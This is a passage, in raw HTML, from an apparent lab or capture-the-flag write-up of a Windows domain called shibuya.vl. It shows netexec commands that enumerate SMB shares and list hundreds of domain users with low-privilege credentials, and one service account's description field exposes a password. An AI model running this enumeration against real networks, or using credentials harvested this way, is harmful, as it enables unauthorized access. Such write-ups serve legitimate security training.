class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\red:red </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">Share Permissions Remark</span><span class="err"> </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">----- ----------- ------ </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">ADMIN$ Remote Admin </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">C$ Default share </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">images$ </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">IPC$ READ Remote IPC </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">NETLOGON READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">SYSVOL READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-shareenum">users READ </span></code></pre></div></div> <p>I’ll poke around at the <code class="language-plaintext highlighter-rouge">users</code> share, but nothing interesting. purple has the same access as red it seems.</p> <h4 id="users">Users</h4> <p>I’ll dump the full users list, 503 users:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-k</span> <span class="nt">-u</span> red <span class="nt">-p</span> red <span class="nt">--users</span> <span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\red:red </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 -Username- -Last PW Set- -BadPW- -Description- </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 _admin 2025-02-15 07:55:29 0 Built-in account for administering the computer/domain </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Guest &lt;never&gt; 0 Built-in account for guest access to the computer/domain </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 krbtgt 2025-02-15 07:24:57 0 Key Distribution Center Service Account </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 svc_autojoin 2025-02-15 07:51:49 0 K5&amp;A6Dw9d8jrKWhV </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Leon.Warren 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Graeme.Kerr 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Joshua.North 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Shaun.Burton 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gillian.Douglas 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Kelly.Davies 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Conor.Fletcher 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Karl.Brown 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Tracey.Wood 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Mohamed.Brooks 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Wendy.Stevenson 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gerald.Allen 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Leigh.Harrison 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Brian.Elliott 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ashleigh.Hancock 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Kevin.Green 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Mathew.Richardson 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Stanley.Johnson 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Sophie.Smith 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Thomas.Wilson 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jacqueline.Taylor 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Georgia.Smith 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Georgia.Kelly 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Alan.Green 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Mohammad.Todd 2025-02-16 10:23:34 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Graham.Francis 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Elaine.Roberts 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ross.Allen 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Grace.Humphries 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Roy.Shepherd 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Emma.Noble 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ryan.Harris 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Suzanne.Webb 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Edward.Smith 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ellie.Chapman 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Bradley.Evans 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Grace.King 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Eric.Barnes 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Tracey.Holmes 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Joan.White 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Leslie.Osborne 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Frederick.Smith 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Joseph.Rowe 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Melanie.Brown 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jodie.Jenkins 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Bethany.Watson 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Cameron.Begum 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jenna.Abbott 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Karl.Smith 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Arthur.Walker 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Sheila.Roberts 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Tom.Barnes 2025-02-16 10:23:35 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Stuart.French 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 William.Johnson 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 David.Poole 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Charlene.Walsh 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jessica.Gordon 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Francesca.Day 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 William.Brown 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Sylvia.Doyle 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 William.Thomas 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Craig.Owen 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Leon.Daly 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jacob.Preston 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lynn.Pearson 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Antony.Howell 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Mary.Grant 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Shirley.Matthews 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Louis.Bond 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Norman.Clayton 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rhys.Moore 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lynn.Gregory 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Abdul.Mason 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Diana.Rowe 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Olivia.Houghton 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Katy.Webster 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Judith.Black 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Henry.Gallagher 2025-02-16 10:23:36 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ryan.Horton 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Dylan.Booth 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Nathan.Matthews 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Georgia.Carter 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Derek.Wade 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 David.Cole 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lynn.Harrison 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rachel.Flynn 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jade.Smith 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Hannah.Taylor 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Carole.Barrett 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Brenda.Peacock 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Robin.Stevens 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Victoria.Jones 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Victor.Clarke 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Joel.Bailey 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Stanley.Lowe 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Billy.Williams 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lorraine.Barber 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Nicole.Walsh 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Mohamed.Daniels 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Joseph.Woods 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Elliott.Hill 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Marie.Campbell 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Cheryl.Patel 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Samuel.Curtis 2025-02-16 10:23:37 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Dennis.Little 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rachael.Taylor 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Helen.Walton 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Richard.Stokes 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Hilary.Collins 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Christopher.Brookes 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Max.Day 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Marcus.Stevenson 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Leon.Murray 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Carly.Franklin 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Luke.Nash 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Terry.Saunders 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Callum.Walker 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Roger.Mills 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Elliott.Page 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Barry.Green 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jill.Clarke 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Vanessa.Harris 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ross.Smith 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jane.Stewart 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gemma.Simpson 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Donald.Holmes 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Tracy.Ferguson 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Damien.Dixon 2025-02-16 10:23:38 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Geraldine.Herbert 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Sarah.Warner 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Bryan.Watts 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Hayley.Morgan 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Glenn.Gough 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Sam.Stone 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Susan.Baker 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Eileen.Anderson 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Vincent.Bryan 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Deborah.Edwards 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rosemary.Edwards 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Dominic.Matthews 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Sylvia.Farrell 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Amanda.Wall 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Timothy.Freeman 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Bethan.Davies 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Alan.Pearce 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Stanley.Smart 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Susan.Butler 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Hannah.Thompson 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Janice.Connolly 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rhys.Marsh 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Phillip.Campbell 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Norman.Evans 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Terry.Sharp 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rosie.Williams 2025-02-16 10:23:39 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Dominic.Jones 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Dorothy.Turner 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Oliver.Rees 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lewis.Robson 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Glenn.Gould 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Max.Clark 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Oliver.Smith 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ronald.Martin 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Donald.Dunn 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Alexander.Wilson 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Geoffrey.Griffiths 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Olivia.Gibson 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Mitchell.Jones 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Philip.Stephens 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jeremy.Riley 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Louis.Wood 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Leanne.Williams 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lisa.Harper 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Marilyn.Jordan 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jenna.Jones 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Marie.Chadwick 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Sandra.Ward 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Stacey.Murray 2025-02-16 10:23:46 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Katy.Jones 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Tina.Lee 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Arthur.Cox 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gareth.Brown 2025-02-16 10:23:40 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gillian.Wallace 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Damien.Thompson 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Harry.Turner 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Terry.Green 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jade.Pearson 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Hugh.Wright 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jonathan.Pugh 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Melanie.Grant 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jeffrey.Taylor 2025-02-16 10:23:41 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 